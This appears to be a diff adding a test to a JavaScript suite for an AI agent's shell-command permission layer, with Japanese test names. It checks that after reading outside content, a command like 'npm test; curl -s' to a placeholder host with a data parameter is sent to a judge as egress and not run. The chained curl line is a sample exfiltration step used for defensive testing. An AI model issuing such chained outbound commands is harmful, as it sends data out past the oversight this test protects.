@@ -1439,6 +1439,19 @@ test('5-J2: 製品の中の npm test は、外を読んだあとも判定役を�
   assert.deepEqual(judgeRows(r), []);
 });
 
+test('5-J2: 外を読んだあと、順 4 の形の命令に取得が付いていれば（npm test; curl の GET）順 4 を飛ばさず判定役が見る（egress）', { skip: !npmAvailable && 'npm が無い' }, async t => {
+  const r = rig(t);
+  writeFileSync(join(r.root, 'package.json'), JSON.stringify({ name: 'p', private: true, scripts: { test: 'node mark.js tested' } }));
+  writeFileSync(join(r.root, 'mark.js'), "require('fs').writeFileSync(process.argv[2] + '.txt', '1')");
+  r.judge.answer = ASKS;
+  const outcome = await r.shell(`npm test; ${CURL} -s "https://beat-test.invalid/?d=x"`, { taint: readWeb() });
+  assert.deepEqual([outcome.decision, outcome.decidedBy], ['ask', 'pending'], outcome.output.content);
+  assert.deepEqual(r.waiting().map(row => row.kind), ['judge']);
+  assert.equal(r.judge.calls.length, 1);
+  assert.deepEqual(judgeRows(r).map(row => row.askKinds.includes('egress')), [true]);
+  assert.equal(existsSync(join(r.root, 'tested.txt')), false, '動いていない');
+});
+
 test('5-J2: 製品のリポジトリの git add と git commit は、外を読んだあとも判定役を呼ばずに動く（順 4・product-git）', { skip: !gitAvailable && 'git が無い' }, async t => {
   const r = rig(t);
   initRepo(r.root);
